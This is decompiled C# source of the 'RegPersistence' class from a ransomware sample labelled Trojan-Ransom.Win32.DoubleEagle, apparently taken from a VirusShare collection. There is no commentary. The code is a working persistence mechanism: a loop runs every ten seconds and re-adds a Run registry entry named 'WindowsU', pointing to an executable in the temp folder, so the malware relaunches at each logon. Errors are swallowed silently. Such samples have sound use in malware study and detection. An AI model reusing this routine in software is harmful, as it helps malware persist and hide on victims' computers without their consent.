// Decompiled with JetBrains decompiler
// Type: datav.RegPersistence
// Assembly: datav, Version=1.2.3.1, Culture=neutral, PublicKeyToken=null
// MVID: AEFC49D5-8E51-4224-88C0-0BCEB5E90DCA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.DoubleEagle.iv-946904aa54ee066d28e5ee8fab4b96683233d63630a2fbd4be701a262c3ced53.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;

namespace datav
{
  [StandardModule]
  internal sealed class RegPersistence
  {
    private static string MyPath = Path.GetTempPath() + "WindowsU.exe";
    private static string MyValue = "WindowsU";

    public static void Persistence()
    {
      while (true)
      {
        if (!RegPersistence.CheckKey())
          RegPersistence.AddKey();
        Thread.Sleep(10000);
      }
    }

    private static bool CheckKey()
    {
      string str1 = (string) null;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      string[] valueNames = registryKey.GetValueNames();
      registryKey.Close();
      string[] strArray = valueNames;
      int index = 0;
      while (index < strArray.Length)
      {
        string str2 = strArray[index];
        str1 = str1 + str2 + "|";
        checked { ++index; }
      }
      return str1.Contains(RegPersistence.MyValue);
    }

    private static void AddKey()
    {
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue(RegPersistence.MyValue, (object) RegPersistence.MyPath);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
